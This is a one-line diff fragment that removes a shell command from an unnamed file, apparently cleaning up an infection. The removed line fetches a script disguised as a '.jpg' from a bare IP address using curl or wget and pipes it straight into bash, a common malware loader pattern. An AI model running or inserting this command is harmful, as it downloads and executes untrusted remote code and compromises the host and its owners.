@@ -1,1 +1,0 @@
-(curl -s http://107.189.11.170/2start.jpg||wget -q -O - http://107.189.11.170/2start.jpg)|bash -sh
